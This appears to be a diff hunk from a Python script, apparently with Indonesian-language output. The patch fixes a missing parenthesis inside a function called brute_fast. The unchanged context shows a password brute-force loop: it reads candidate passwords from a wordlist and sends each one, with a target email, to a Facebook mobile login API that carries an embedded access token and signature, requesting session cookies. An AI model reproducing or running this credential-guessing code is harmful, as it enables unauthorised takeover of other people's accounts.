@@ -85,7 +85,7 @@ def brute_fast():
                 san_dev = open("wordlist.txt", "r")
                 for pas in san_dev:
                     pas = pas.replace("\n", "")
-                    sys.stdout.write("\r Mencoba ==> " + pas
+                    sys.stdout.write("\r Mencoba ==> " + pas)
                     sys.stdout.flush()
                     Dev_ID = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pas + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     dev = json.loads(Dev_ID.text)
